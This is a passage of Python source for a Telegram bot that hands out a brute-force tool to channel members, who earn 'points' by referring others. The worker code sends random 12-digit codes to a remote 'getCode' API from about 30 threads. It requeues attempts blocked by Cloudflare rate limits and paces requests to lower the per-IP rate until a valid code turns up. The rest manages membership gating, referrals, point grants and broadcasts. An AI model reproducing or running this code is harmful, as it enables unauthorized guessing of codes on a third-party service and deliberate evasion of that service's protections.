                    local_sess, "getCode", {"code": code}, user_key, data_key, access_token
                )
            except Exception:
                # Connection error — remove from tested set and put back in queue.
                # Block until space is available (up to 30 s) so no code is ever
                # silently dropped. Exits early if stop is requested.
                with user_session.tested_lock:
                    user_session.tested_codes.discard(code)
                _deadline = time.time() + 30
                while time.time() < _deadline:
                    try:
                        code_queue.put(code, timeout=1)
                        break
                    except queue.Full:
                        if stop_event.is_set():
                            break
                continue
            # Small delay between requests — reduces per-IP request rate
            # without meaningfully hurting throughput across 30 workers.
            time.sleep(0.1)
            if status == 200:
                with user_session.stats_lock:
                    user_session.current_stats["valid"] += 1
                    user_session.current_stats["checked"] += 1
                    user_session.current_found_code = code
                # only first finder wins
                if not stop_event.is_set():
                    # set payload before flag so main loop never sees empty found_code
                    if not getattr(stop_event, "found_code", None):
                        stop_event.found_code = code
                        stop_event.found_response = resp
                    stop_event.set()
                break
            elif status == 0 or status == 429 or (500 <= status < 600):
                # Network blip OR Cloudflare/server rate-limit — the code was NOT
                # actually checked. Remove from tested set and re-queue so it gets
                # a genuine attempt later. Never count these as invalid.
                with user_session.tested_lock:
                    user_session.tested_codes.discard(code)
                if status == 429:
                    # Back off before re-queuing so we stop hammering the rate-limit.
                    time.sleep(2)
                _deadline = time.time() + 30
                while time.time() < _deadline:
                    try:
                        code_queue.put(code, timeout=1)
                        break
                    except queue.Full:
                        if stop_event.is_set():
                            break
                if REQUEST_DELAY and REQUEST_DELAY > 0:
                    time.sleep(REQUEST_DELAY)
            else:
                # Genuine invalid code (4xx other than 429) — count and persist.
                do_write = False
                with user_session.stats_lock:
                    user_session.current_stats["invalid"] += 1
                    user_session.current_stats["checked"] += 1
                    # flush more often so crash/restart loses fewer codes
                    if user_session.current_stats["invalid"] % 25 == 0:
                        do_write = True
                # File I/O happens OUTSIDE the lock so workers are not blocked
                if do_write:
                    try:
                        with open(user_session.invalid_codes_file, "a", encoding="utf-8") as _f:
                            _f.write(code + "\n")
                    except Exception:
                        pass
    finally:
        try:
            if local_sess is not None:
                local_sess.close()
        except Exception:
            pass


def code_generator(code_queue, stop_event, tested_codes, tested_lock):
    """Keep feeding unique codes. Never die just because queue was full briefly."""
    while not stop_event.is_set():
        new_code = str(random.randint(100000000000, 999999999999))
        with tested_lock:
            if new_code in tested_codes:
                continue
        try:
            code_queue.put(new_code, timeout=1)
        except queue.Full:
            # workers busy — wait and keep going
            time.sleep(0.05)
            continue
        time.sleep(0.005)


# ---------- Global state ----------
user_sessions = {}
sessions_lock = threading.Lock()


def get_or_create_session(chat_id):
    try:
        chat_id = int(chat_id)
    except Exception:
        pass
    with sessions_lock:
        if chat_id not in user_sessions:
            s = UserSession(chat_id)
            user_sessions[chat_id] = s
            t = threading.Thread(target=s.run_session_loop, daemon=True)
            s.session_thread = t
            t.start()
        return user_sessions[chat_id]


def unlock_after_join(chat_id, user_info=None):
    """Auto-approve member after channels verified. No request-access step."""
    user_info = user_info or {}
    username = user_info.get("username", "") or ""
    first_name = (user_info.get("first_name", "") or "").replace("*", "").replace("_", "").replace("`", "")
    ref_by = get_referrer_for_user(chat_id) or ""
    if ref_by:
        with referrals_lock:
            referrals.setdefault("pending", {}).setdefault(str(int(chat_id)), str(ref_by))
            save_referrals(referrals)
    was_new = auto_approve_member(chat_id, username=username, first_name=first_name, referred_by=ref_by)
    store_access_request(chat_id, username=username, first_name=first_name, referred_by=ref_by)
    # Welcome point: new user gets 1 point on first channel join
    if was_new and not is_admin(chat_id):
        try:
            with users_lock:
                key = str(int(chat_id))
                u = authorized_users.get(key, {})
                if u:
                    u["points_balance"] = int(u.get("points_balance", 0) or 0) + 1
                    authorized_users[key] = u
                    save_authorized_users(authorized_users)
            print(f"[WELCOME] +1 point to new user {chat_id} on channel join")
        except Exception as e:
            print(f"[WELCOME] grant failed for {chat_id}: {e}")


# ---------- Callback handler ----------
def handle_callback_query(callback_query):
    cq_id = callback_query["id"]
    chat_id = callback_query["message"]["chat"]["id"]
    data = callback_query.get("data", "")
    answered = False

    def _ack(text=None):
        nonlocal answered
        if answered:
            return
        answer_callback_query(cq_id, text)
        answered = True

    try:
        # Refresh / show clean join UI
        if data == "refresh_join":
            _ack()
            invalidate_membership_cache(chat_id)
            _, _, status_map = check_channel_membership_cached(chat_id, force=True)
            send_join_gate(chat_id, status_map=status_map)
            return

        # Verify membership → auto unlock (no request access)
        if data == "check_joined":
            invalidate_membership_cache(chat_id)
            all_joined, unjoined, status_map = check_channel_membership_cached(chat_id, force=True)
            if all_joined:
                # Do NOT invalidate again here — the fresh result above is still valid
                # and should be kept in cache to avoid an immediate redundant re-fetch.
                _ack("Verified — both channels joined")
                unlock_after_join(chat_id, callback_query.get("from", {}))
                if is_authorized(chat_id):
                    kb = admin_keyboard() if is_admin(chat_id) else main_menu_keyboard()
                    send_telegram(
                        chat_id,
                        "✅ *Membership verified*\n"
                        "────────────────\n"
                        "🎉 You're all set\n"
                        "👉 Pick an action below",
                        kb,
                    )
                else:
                    send_telegram(
                        chat_id,
                        "✅ *Membership verified*\n\n" + no_time_message(chat_id),
                        main_menu_keyboard(),
                    )
            else:
                _ack("Still missing channels")
                missing = "\n".join(
                    f"⬜ [{get_channel_display_name(c)}]({get_channel_link(c)})" for c in unjoined
                )
                send_telegram(
                    chat_id,
                    f"❌ *Not complete yet*\n────────────────\nStill need to join:\n{missing}\n\n👉 Join them, then tap *✅ I've Joined*.",
                    join_channels_keyboard(status_map=status_map),
                )
            return

        # Legacy request_access button → same as auto unlock
        if data == "request_access":
            invalidate_membership_cache(chat_id)
            all_joined, unjoined, status_map = check_channel_membership_cached(chat_id, force=True)
            if not all_joined:
                _ack("Join channels first")
                send_join_gate(
                    chat_id,
                    status_map=status_map,
                    intro="Join *all* channels first.",
                )
                return
            _ack("Access unlocked")
            unlock_after_join(chat_id, callback_query.get("from", {}))
            if is_authorized(chat_id):
                kb = admin_keyboard() if is_admin(chat_id) else main_menu_keyboard()
                send_telegram(chat_id, home_message(chat_id), kb)
            else:
                send_telegram(chat_id, no_time_message(chat_id), main_menu_keyboard())
            return

        # Admin-only callbacks — ALWAYS ack so the Users button never spins forever
        if is_admin(chat_id):
            if data == "cmd_admin_home":
                _ack()
                send_telegram(chat_id, home_message(chat_id), admin_keyboard())
                return
            if data == "cmd_requests":
                _ack()
                send_telegram(chat_id, format_requests_page(), requests_keyboard())
                return
            if data == "cmd_grant1":
                _ack()
                with admin_pending_lock:
                    # dict payload: step + optional target user
                    admin_pending_input[chat_id] = {"action": "grant", "step": "user"}
                send_telegram(
                    chat_id,
                    "🎁 *Grant Points*\n"
                    "────────────────\n"
                    "📝 Send in one line:\n"
                    "`<user_id> <points>`\n"
                    "✨ Example: `123456789 5` → *5 points*\n\n"
                    "Or just the user id, then send points next.\n"
                    f"⏭ Default if skipped: *{_fmt_points(ADMIN_GRANT_POINTS)}*\n\n"
                    "🔢 Any plain number = points\n"
                    "❌ Send /cancel to abort",
                    admin_keyboard(),
                )
                return
            if data == "cmd_grant_all":
                _ack()
                with users_lock:
                    _member_count = len([k for k in authorized_users.keys()
                                          if str(k).lstrip("-").isdigit() and int(k) not in ADMIN_IDS])
                with admin_pending_lock:
                    admin_pending_input[chat_id] = {"action": "grant_all", "step": "points"}
                send_telegram(
                    chat_id,
                    f"🎯 *Grant Points to ALL Members*\n"
                    f"────────────────\n"
                    f"👥 Members: *{_member_count}*\n\n"
                    "💎 How many points to give *everyone*?\n"
                    "🔢 Send a number (e.g. `2`, `5`, `12`)\n"
                    "❌ Send /cancel to abort",
                    admin_keyboard(),
                )
                return
            if data.startswith("adm_approve_"):
                _ack("Approved")
                try:
                    uid = int(data.split("adm_approve_")[1])
                except Exception:
                    send_telegram(chat_id, "❌ Bad approve id", admin_keyboard())
                    return
                name = username = ""
                with requests_lock:
                    for r in access_requests:
                        if int(r.get("id", 0)) == uid:
                            name = r.get("name") or ""
                            username = r.get("username") or ""
                            break
                approve_user(uid, name=name, username=username)
                send_telegram(
                    chat_id,
                    f"✅ Approved `{uid}` (no free points). They must refer for {_fmt_reward()}.",
                    requests_keyboard(),
                )
                return
            if data.startswith("adm_deny_"):
                _ack("Denied")
                try:
                    uid = int(data.split("adm_deny_")[1])
                except Exception:
                    send_telegram(chat_id, "❌ Bad deny id", admin_keyboard())
                    return
                set_request_status(uid, "denied")
                send_telegram(uid, "❌ Your access was denied by admin.")
                send_telegram(chat_id, f"❌ Denied `{uid}`.", requests_keyboard())
                return
            if data == "cmd_list" or data.startswith("cmd_list_page_"):
                _ack("Loading users…")
                page = 0
                if data.startswith("cmd_list_page_"):
                    try:
                        page = int(data.split("cmd_list_page_")[1])
                    except Exception:
                        page = 0
                send_users_list(chat_id, page=page)
                return
            if data == "cmd_broadcast_prompt":
                _ack()
                send_telegram(chat_id, "📢 Send: `/broadcast <message>`")
                return
            if data == "cmd_usage":
                _ack()
                send_telegram(chat_id, get_usage_report(), admin_keyboard())
                return

        # Continuous channel membership
        ok, status_map = enforce_channel_membership(
            chat_id,
            force=True,
            intro="⛔ *Access locked*\nStay joined in both channels to use the bot.",
        )
        if not ok:
            _ack("Rejoin required channels")
            return

        # Ensure approved after join (auto)
        if not is_approved(chat_id) and not is_admin(chat_id):
            unlock_after_join(chat_id, callback_query.get("from", {}))

        if data in ("cmd_refer", "cmd_my_access", "cmd_home") and (is_admin(chat_id) or is_approved(chat_id)):
            _ack()
            kb = admin_keyboard() if is_admin(chat_id) else main_menu_keyboard()
            if data == "cmd_refer":
                send_telegram(chat_id, refer_card(chat_id), kb)
                return
            if data == "cmd_my_access":
                send_telegram(chat_id, access_card(chat_id), kb)
                return
            send_telegram(chat_id, home_message(chat_id), kb)
            return

        if not is_authorized(chat_id):
            _ack("Refer to earn points")
            send_telegram(chat_id, no_time_message(chat_id), main_menu_keyboard())
            return

        _ack()

        if data == "cmd_refer":
            send_telegram(
                chat_id,
                refer_card(chat_id),
                admin_keyboard() if is_admin(chat_id) else main_menu_keyboard(),
            )
            return
        if data == "cmd_my_access":
            send_telegram(
                chat_id,
                access_card(chat_id),
                admin_keyboard() if is_admin(chat_id) else main_menu_keyboard(),
            )
            return
        if data == "cmd_home":
            send_telegram(
                chat_id,
                home_message(chat_id),
                admin_keyboard() if is_admin(chat_id) else main_menu_keyboard(),
            )
            return

        user_session = get_or_create_session(chat_id)

        if data == "cmd_stats":
            kb = admin_keyboard() if is_admin(chat_id) else main_menu_keyboard()
            send_telegram(chat_id, user_session.get_stats_reply(), kb)
            return

        if data == "cmd_stop":
            if user_session.request_stop():
                send_telegram(chat_id, "🛑 Stopping session…")
            else:
                send_telegram(chat_id, "ℹ️ No active session right now.")
            return

        if data == "cmd_new":
            if not user_session.session_active:
                user_session.next_session_mode = "full"
                user_session.new_session_event.set()
                send_telegram(chat_id, "🚀 Starting full session…")
            else:
                send_telegram(chat_id, "⚠️ Session already running.\n👉 Tap *🛑 Stop* first.")
            return

        if data == "cmd_login":
            if not user_session.session_active:
                user_session.next_session_mode = "login"
                user_session.new_session_event.set()
                send_telegram(chat_id, "🔑 Starting login-only session…")
            else:
                send_telegram(chat_id, "⚠️ Session already running.\n👉 Tap *🛑 Stop* first.")
            return
    finally:
        # never leave Telegram button spinner hanging
        _ack()


# ---------- Keyword button handler ----------
def handle_keyword_button(chat_id, text, from_user=None):
    """Handle keyword (reply) button text as commands.
    Keyword buttons send plain text — we match them to the old callback_data actions."""
    from_user = from_user or {}

    if text == "🏠 Home":
        send_telegram(chat_id, home_message(chat_id), admin_keyboard() if is_admin(chat_id) else main_menu_keyboard())
        return True

    if text == "🎁 Invite & Earn" or text == "🔗 Invite":
        send_telegram(chat_id, refer_card(chat_id), admin_keyboard() if is_admin(chat_id) else main_menu_keyboard())
        return True

    if text == "💎 My Points":
        send_telegram(chat_id, access_card(chat_id), admin_keyboard() if is_admin(chat_id) else main_menu_keyboard())
        return True

    if text == "📊 Live Stats":
        user_session = get_or_create_session(chat_id)
        send_telegram(chat_id, user_session.get_stats_reply(), admin_keyboard() if is_admin(chat_id) else main_menu_keyboard())
        return True

    if text == "🛑 Stop" or text == "🛑 Stop Search":
        user_session = get_or_create_session(chat_id)
        if user_session.request_stop():
            send_telegram(chat_id, "🛑 Stopping session…")
        else:
            send_telegram(chat_id, "ℹ️ No active session right now.")
        return True

    if text == "🚀 Start Session":
        user_session = get_or_create_session(chat_id)
        if not user_session.session_active:
            user_session.next_session_mode = "full"
            user_session.new_session_event.set()
            send_telegram(chat_id, "🚀 Starting full session…")
        else:
            send_telegram(chat_id, "⚠️ Session already running.\n👉 Tap *🛑 Stop* first.")
        return True

    if text == "🔑 Login Only":
        user_session = get_or_create_session(chat_id)
        if not user_session.session_active:
            user_session.next_session_mode = "login"
            user_session.new_session_event.set()
            send_telegram(chat_id, "🔑 Starting login-only session…")
        else:
            send_telegram(chat_id, "⚠️ Session already running.\n👉 Send /stop first.")
        return True

    # Admin-only keyword buttons
    if not is_admin(chat_id):
        return False

    if text == "📥 Members":
        send_telegram(chat_id, format_requests_page(), requests_keyboard())
        return True

    if text == "👥 Users":
        send_users_list(chat_id, page=0)
        return True

    if text == "🎁 Grant Points":
        with admin_pending_lock:
            admin_pending_input[chat_id] = {"action": "grant", "step": "user"}
        send_telegram(
            chat_id,
            "🎁 *Grant Points*\n"
            "────────────────\n"
            "📝 Send in one line:\n"
            "`<user_id> <points>`\n"
            "✨ Example: `123456789 5` → *5 points*\n\n"
            "Or just the user id, then send points next.\n"
            f"⏭ Default if skipped: *{_fmt_points(ADMIN_GRANT_POINTS)}*\n\n"
            "🔢 Any plain number = points\n"
            "❌ Send /cancel to abort",
            admin_keyboard(),
        )
        return True

    if text == "📈 Usage":
        send_telegram(chat_id, get_usage_report(), admin_keyboard())
        return True

    if text == "📢 Broadcast":
        send_telegram(chat_id, "📢 Send: `/broadcast <message>`")
        return True

    if text == "🎯 Grant All Members":
        with users_lock:
            _member_count = len([k for k in authorized_users.keys()
                                  if str(k).lstrip("-").isdigit() and int(k) not in ADMIN_IDS])
        with admin_pending_lock:
            admin_pending_input[chat_id] = {"action": "grant_all", "step": "points"}
        send_telegram(
            chat_id,
            f"🎯 *Grant Points to ALL Members*\n"
            f"────────────────\n"
            f"👥 Members: *{_member_count}*\n\n"
            "💎 How many points to give *everyone*?\n"
            "🔢 Send a number (e.g. `2`, `5`, `12`)\n"
            "❌ Send /cancel to abort",
            admin_keyboard(),
        )
        return True

    if text == "⬅️ Dashboard":
        send_telegram(chat_id, home_message(chat_id), admin_keyboard())
        return True

    if text == "🔄 Refresh Log":
        send_telegram(chat_id, format_requests_page(), requests_keyboard())
        return True

    # Handle "✅ <uid>" approve buttons
    if text.startswith("✅ "):
        parts = text[3:].strip()
        if parts.isdigit():
            uid = int(parts)
            name = username = ""
            with requests_lock:
                for r in access_requests:
                    if int(r.get("id", 0)) == uid:
                        name = r.get("name") or ""
                        username = r.get("username") or ""
                        break
            approve_user(uid, name=name, username=username)
            send_telegram(
                chat_id,
                f"✅ Approved `{uid}` (no free points). They must refer for {_fmt_reward()}.",
                requests_keyboard(),
            )
            return True

    # Handle "❌ <uid>" deny buttons
    if text.startswith("❌ "):
        parts = text[3:].strip()
        if parts.isdigit():
            uid = int(parts)
            set_request_status(uid, "denied")
            send_telegram(uid, "❌ Your access was denied by admin.")
            send_telegram(chat_id, f"❌ Denied `{uid}`.", requests_keyboard())
            return True

    # Handle user list pagination: "⬅️ Prev (0)", "Next ➡️ (0)", "🔄 Refresh (0)"
    import re
    prev_match = re.match(r"⬅️ Prev \((\d+)\)", text)
    next_match = re.match(r"Next ➡️ \((\d+)\)", text)
    refresh_match = re.match(r"🔄 Refresh \((\d+)\)", text)
    if prev_match:
        page = int(prev_match.group(1)) - 1
        send_users_list(chat_id, page=page)
        return True
    if next_match:
        page = int(next_match.group(1)) + 1
        send_users_list(chat_id, page=page)
        return True
    if refresh_match:
        page = int(refresh_match.group(1))
        send_users_list(chat_id, page=page)
        return True

    return False


# ---------- Telegram listener ----------
def telegram_listener():
    offset = None
    while True:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates?timeout=25"
        if offset:
            url += f"&offset={offset}"
        try:
            resp = requests.get(url, timeout=35)
            try:
                data = resp.json()
            except Exception:
                time.sleep(1)
                continue
            if not isinstance(data, dict) or not data.get("ok"):
                time.sleep(1)
                continue
            for update in data.get("result", []):
                offset = update["update_id"] + 1

                callback_query = update.get("callback_query")
                if callback_query:
                    try:
                        handle_callback_query(callback_query)
                    except Exception as e:
                        print("Callback error:", e)
                        try:
                            answer_callback_query(callback_query.get("id"), "Error")
                        except Exception:
                            pass
                    continue

                msg = update.get("message")
                if not msg:
                    continue
                chat_id = msg["chat"]["id"]
                text = msg.get("text", "").strip()

                # Handle keyword (reply) button text FIRST before other logic
                if handle_keyword_button(chat_id, text, msg.get("from", {})):
                    continue

                if is_admin(chat_id):
                    lower = text.lower()
                    if lower == "/cancel":
                        with admin_pending_lock:
                            admin_pending_input.pop(chat_id, None)
                        send_telegram(chat_id, "❌ Cancelled.", admin_keyboard())
                        continue
                    with admin_pending_lock:
                        pending_action = admin_pending_input.get(chat_id)
                    # Normalize legacy string pending values
                    if pending_action == "grant1day":
                        pending_action = {"action": "grant", "step": "user"}
                        with admin_pending_lock:
                            admin_pending_input[chat_id] = pending_action
                    if isinstance(pending_action, dict) and pending_action.get("action") == "grant_all":
                        if lower.startswith("/"):
                            with admin_pending_lock:
                                admin_pending_input.pop(chat_id, None)
                            # fall through to other commands
                        else:
                            pts = _parse_points_token(text)
                            if pts is None or pts <= 0:
                                send_telegram(
                                    chat_id,
                                    "❌ Send a positive number of points (e.g. `2`, `5`, `12`), or /cancel to abort.",
                                )
                                continue
                            with admin_pending_lock:
                                admin_pending_input.pop(chat_id, None)
                            with users_lock:
                                all_member_ids = [
                                    int(k) for k in authorized_users.keys()
                                    if str(k).lstrip("-").isdigit() and int(k) not in ADMIN_IDS
                                ]
                            total = len(all_member_ids)
                            send_telegram(
                                chat_id,
                                f"🎯 Granting *{_fmt_points(pts)}* to *{total}* members…",
                                admin_keyboard(),
                            )
                            def _do_grant_all(admin_id, member_ids, points):
                                ok_count = 0
                                fail_count = 0
                                for uid in member_ids:
                                    try:
                                        ok, _ = admin_grant_user(uid, points=points)
                                        if ok:
                                            ok_count += 1
                                        else:
                                            fail_count += 1
                                    except Exception:
                                        fail_count += 1
                                send_telegram(
                                    admin_id,
                                    f"✅ *Grant All done!*\n"
                                    f"📤 Granted: *{ok_count}*\n"
                                    f"❌ Failed: *{fail_count}*\n"
                                    f"💎 Each got *{_fmt_points(points)}* added.",
                                    admin_keyboard(),
                                )
                            threading.Thread(
                                target=_do_grant_all,
                                args=(chat_id, all_member_ids, pts),
                                daemon=True,
                            ).start()
                            continue

                    if isinstance(pending_action, dict) and pending_action.get("action") == "grant":
                        step = pending_action.get("step") or "user"
                        # /skip must work on hours step (do NOT treat as cancel)
                        if lower in ("/skip", "skip", "default") and step == "hours":
                            try:
                                gid = int(pending_action.get("user_id") or 0)
                            except Exception:
                                gid = 0
                            with admin_pending_lock:
                                admin_pending_input.pop(chat_id, None)
                            if gid <= 0:
                                send_telegram(chat_id, "❌ Bad user id. Start Grant Points again.", admin_keyboard())
                                continue
                            ok, msg = admin_grant_user(gid, points=ADMIN_GRANT_POINTS)
                            send_telegram(chat_id, msg, admin_keyboard())
                            continue
                        # Other slash commands cancel pending grant, then fall through
                        if lower.startswith("/"):
                            with admin_pending_lock:
                                admin_pending_input.pop(chat_id, None)
                            # fall through so /grant /list etc. still work
                        else:
                            parts = text.split()
                            if step == "user":
                                # Accept: "<id>" | "<id> <hours>" | "<id> <hours>h"
                                if not parts or not parts[0].lstrip("-").isdigit():
                                    send_telegram(
                                        chat_id,
                                        "❌ Send `user_id` or `user_id hours`\n"
                                        "Example: `123456789 3`",
                                    )
                                    continue
                                gid = int(parts[0])
                                if len(parts) >= 2:
                                    pts = _parse_points_token(parts[1])
                                    if pts is None:
                                        send_telegram(chat_id, "❌ Points must be a number, e.g. `5`")
                                        continue
                                    with admin_pending_lock:
                                        admin_pending_input.pop(chat_id, None)
                                    ok, msg = admin_grant_user(gid, points=pts)
                                    send_telegram(chat_id, msg, admin_keyboard())
                                    continue
                                # only id → ask for hours (any number = hours)
                                with admin_pending_lock:
                                    admin_pending_input[chat_id] = {
                                        "action": "grant",
                                        "step": "hours",
                                        "user_id": gid,
                                    }
                                send_telegram(
                                    chat_id,
                                    "💎 *Points to grant*\n"
                                    "────────────────\n"
                                    f"👤 User: `{gid}`\n"
                                    "🔢 Send any number = points\n"
                                    f"✨ Examples: `1` · `5` · `10`\n"
                                    f"⏭ `/skip` = default *{_fmt_points(ADMIN_GRANT_POINTS)}*",
                                )
                                continue
                            if step == "hours":
                                gid = int(pending_action.get("user_id") or 0)
                                pts = _parse_points_token(text)
                                if pts is None:
                                    send_telegram(
                                        chat_id,
                                        "❌ Send a number of points (e.g. `1`), or /skip /cancel",
                                    )
                                    continue
                                with admin_pending_lock:
                                    admin_pending_input.pop(chat_id, None)
                                ok, msg = admin_grant_user(gid, points=pts)
                                send_telegram(chat_id, msg, admin_keyboard())
                                continue
                    if lower.startswith("/grantall"):
                        # /grantall <points> — grant points to ALL members at once
                        try:
                            parts = text.split()
                            if len(parts) < 2:
                                raise ValueError("usage")
                            pts = _parse_points_token(parts[1])
                            if pts is None or pts <= 0:
                                raise ValueError("points")
                            with users_lock:
                                all_member_ids = [
                                    int(k) for k in authorized_users.keys()
                                    if str(k).lstrip("-").isdigit() and int(k) not in ADMIN_IDS
                                ]
                            total = len(all_member_ids)
                            send_telegram(
                                chat_id,
                                f"🎯 Granting *{_fmt_points(pts)}* to *{total}* members…",
                                admin_keyboard(),
                            )
                            def _ga(admin_id, member_ids, points):
                                ok_c = fail_c = 0
                                for uid in member_ids:
                                    try:
                                        ok, _ = admin_grant_user(uid, points=points)
                                        if ok:
                                            ok_c += 1
                                        else:
                                            fail_c += 1
                                    except Exception:
                                        fail_c += 1
                                send_telegram(
                                    admin_id,
                                    f"✅ *Grant All done!*\n"
                                    f"📤 Granted: *{ok_c}*\n"
                                    f"❌ Failed: *{fail_c}*\n"
                                    f"💎 Each got *{_fmt_points(points)}* added.",
                                    admin_keyboard(),
                                )
                            threading.Thread(target=_ga, args=(chat_id, all_member_ids, pts), daemon=True).start()
                        except Exception:
                            send_telegram(
                                chat_id,
                                "❌ Usage: `/grantall <points>`\n"
                                "Example: `/grantall 2` → gives every member *2 points*",
                            )
                        continue
                    if lower.startswith("/grant"):
                        # /grant <id> [points]   — any number after id = points
                        try:
                            parts = text.split()
                            if len(parts) < 2 or not parts[1].lstrip("-").isdigit():
                                raise ValueError("usage")
                            gid = int(parts[1])
                            pts = ADMIN_GRANT_POINTS
                            if len(parts) >= 3:
                                parsed = _parse_points_token(parts[2])
                                if parsed is None:
                                    send_telegram(chat_id, "❌ Points must be a number. Example: `/grant 123456789 5`")
                                    continue
                                pts = parsed
                            ok, msg = admin_grant_user(gid, points=pts)
                            send_telegram(chat_id, msg, admin_keyboard())
                        except Exception:
                            send_telegram(
                                chat_id,
                                "❌ Usage: `/grant <id> [points]`\n"
                                "Examples:\n"
                                "`/grant 123456789` → default points\n"
                                "`/grant 123456789 5` → *5 points*",
                            )
                        continue
                    if lower.startswith("/add "):
                        try:
                            new_id = int(text.split()[1])
                            approve_user(new_id)
                            send_telegram(
                                chat_id,
                                f"✅ Approved `{new_id}` (no free points — they must refer for {_fmt_reward()}).",
                                admin_keyboard(),
                            )
                        except Exception:
                            send_telegram(chat_id, "❌ Usage: `/add <id>`")
                        continue
                    if lower.startswith("/deny "):
                        try:
                            did = int(text.split()[1])
                            set_request_status(did, "denied")
                            send_telegram(did, "❌ Your access was denied by admin.")
                            send_telegram(chat_id, f"❌ Denied `{did}`.", admin_keyboard())
                        except Exception:
                            send_telegram(chat_id, "❌ Usage: `/deny <id>`")
                        continue
                    if lower.startswith("/remove "):
                        try:
                            rid = int(text.split()[1])
                            if rid in ADMIN_IDS:
                                send_telegram(chat_id, "⚠️ Can't remove admin.")
                                continue
                            if revoke_access(rid):
                                send_telegram(chat_id, f"✅ Removed `{rid}`.", admin_keyboard())
                            else:
                                send_telegram(chat_id, f"⚠️ `{rid}` not in list.")
                        except Exception:
                            send_telegram(chat_id, "❌ Usage: `/remove <id>`")
                        continue
                    if lower == "/list":
                        send_users_list(chat_id, page=0)
                        continue
                    if lower == "/requests":
                        send_telegram(chat_id, format_requests_page(), requests_keyboard())
                        continue
                    if lower.startswith("/broadcast "):
                        bmsg = text[len("/broadcast "):]
                        if not bmsg.strip():
                            send_telegram(chat_id, "❌ Usage: `/broadcast <message>`", admin_keyboard())
                            continue
                        with users_lock:
                            recipients = [
                                int(x) for x in authorized_users.keys()
                                if str(x).lstrip("-").isdigit() and int(x) not in ADMIN_IDS
                            ]
                        # Don't block the Telegram listener for hundreds of sends
                        def _do_broadcast(admin_id, message, uids):
                            sent = 0
                            fail = 0
                            for uid in uids:
                                try:
                                    send_telegram(uid, f"📢 {message}")
                                    sent += 1
                                except Exception:
                                    fail += 1
                                time.sleep(0.05)
                            send_telegram(
                                admin_id,
                                f"✅ Broadcast done\n📤 Sent: *{sent}*\n❌ Failed: *{fail}*",
                                admin_keyboard(),
                            )
                        threading.Thread(
                            target=_do_broadcast,
                            args=(chat_id, bmsg, recipients),
                            daemon=True,
                        ).start()
                        send_telegram(
                            chat_id,
                            f"📢 Broadcasting to *{len(recipients)}* users…",
                            admin_keyboard(),
                        )
                        continue
                    if lower == "/usage":
                        send_telegram(chat_id, get_usage_report(), admin_keyboard())
                        continue

                if text.lower().startswith("/start"):
                    parts = text.split(maxsplit=1)
                    payload = parts[1].strip() if len(parts) >= 2 else ""
                    ref_str = ""
                    if payload.startswith("ref_"):
                        ref_str = payload[4:].split()[0]
                    elif payload.isdigit():
                        ref_str = payload
                    if ref_str.isdigit():
                        rid = int(ref_str)
                        if rid != chat_id and not is_admin(chat_id):
                            with referrals_lock:
                                already_pending = str(chat_id) in referrals.get("pending", {})
                                already_done = any(
                                    str(c.get("new_user")) == str(chat_id)
                                    for c in referrals.get("completed", [])
                                )
                                if not already_pending and not already_done:
                                    referrals.setdefault("pending", {})[str(chat_id)] = str(rid)
                                    save_referrals(referrals)
                                    print(f"[REFERRAL] pending set new_user={chat_id} referrer={rid}")
                            send_telegram(
                                chat_id,
                                "👋 *Welcome!*\n"
                                "────────────────\n"
                                f"🎁 Invited by `{rid}`\n\n"
                                "1️⃣ Join both channels\n"
                                "2️⃣ Tap *✅ I've Joined*\n"
                                f"3️⃣ Your friend gets *{_fmt_reward()}*",
                            )

                ok, status_map = enforce_channel_membership(
                    chat_id,
                    force=False,
                    intro="⛔ *Access locked*\nStay joined in both channels to use the bot.",
                )
                if not ok:
                    continue

                # Auto-approve after join — no request-access gate
                if not is_admin(chat_id) and not is_approved(chat_id):
                    unlock_after_join(chat_id, msg.get("from", {}))

                if not is_authorized(chat_id):
                    send_telegram(chat_id, no_time_message(chat_id), main_menu_keyboard())
                    continue

                user_session = get_or_create_session(chat_id)

                if text.lower() in ("/start", "/help", "/menu", "/home"):
                    kb = admin_keyboard() if is_admin(chat_id) else main_menu_keyboard()
                    send_telegram(chat_id, home_message(chat_id), kb)
                    continue

                if text.lower() == "/stop":
                    if user_session.request_stop():
                        send_telegram(chat_id, "🛑 Stopping session…")
                    else:
                        send_telegram(chat_id, "ℹ️ No active session right now.")
                    continue

                if text.lower() == "/stats":
                    kb = admin_keyboard() if is_admin(chat_id) else main_menu_keyboard()
                    send_telegram(chat_id, user_session.get_stats_reply(), kb)
                    continue

                if text.lower() == "/new":
                    if not user_session.session_active:
                        user_session.next_session_mode = "full"
                        user_session.new_session_event.set()
                        send_telegram(chat_id, "🚀 Starting full session…")
                    else:
                        send_telegram(chat_id, "⚠️ Session already running.\n👉 Send /stop first.")
                    continue

                if text.lower() == "/login":
                    if not user_session.session_active:
                        user_session.next_session_mode = "login"
                        user_session.new_session_event.set()
                        send_telegram(chat_id, "🔑 Starting login-only session…")
                    else:
                        send_telegram(chat_id, "⚠️ Session already running.\n👉 Send /stop first.")
                    continue

                user_session.handle_input(text)

        except Exception as e:
            print("Listener error:", e)
            time.sleep(1)


def membership_watchdog():
    while True:
        try:
            with sessions_lock:
                active_ids = [cid for cid, s in user_sessions.items() if s.session_active]
            for cid in active_ids:
                if is_admin(cid):
                    continue
                all_joined, _, status_map = check_channel_membership_cached(cid, force=True)
                if all_joined:
                    continue
                stop_user_session_if_active(
                    cid,
                    reason=(
                        "⛔ *Session stopped*\n"
                        "────────────────\n"
                        "You left a required channel."
                    ),
                )
                send_join_gate(
                    cid,
                    status_map=status_map,
                    intro="⛔ *Access locked*\nRejoin both channels to continue.",
                )
        except Exception as e:
            print("Watchdog error:", e)
        time.sleep(30)


def main():
    global BOT_USERNAME
    load_usage_log()
    print(f"DATA_DIR={DATA_DIR}")
    print(f"Members file: {AUTHORIZED_USERS_FILE}")
    print(f"Loaded members: {len(authorized_users)}")
    print(f"Search: THREADS/user={THREADS} GLOBAL_WORKERS={GLOBAL_SEARCH_WORKERS} POOL_MAX={_POOL_MAX}")
    print(f"Referral reward: {REFERRAL_POINTS} points | Admin default grant: {ADMIN_GRANT_POINTS} points")
    try:
        r = requests.get(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getMe", timeout=10)
        try:
            j = r.json()
        except Exception:
            j = {}
        if isinstance(j, dict) and j.get("ok"):
            BOT_USERNAME = j["result"].get("username") or ""
            print(f"Bot username: @{BOT_USERNAME}")
        else:
            print(f"getMe not ok: {j}")
    except Exception as e:
        print(f"getMe failed: {e}")

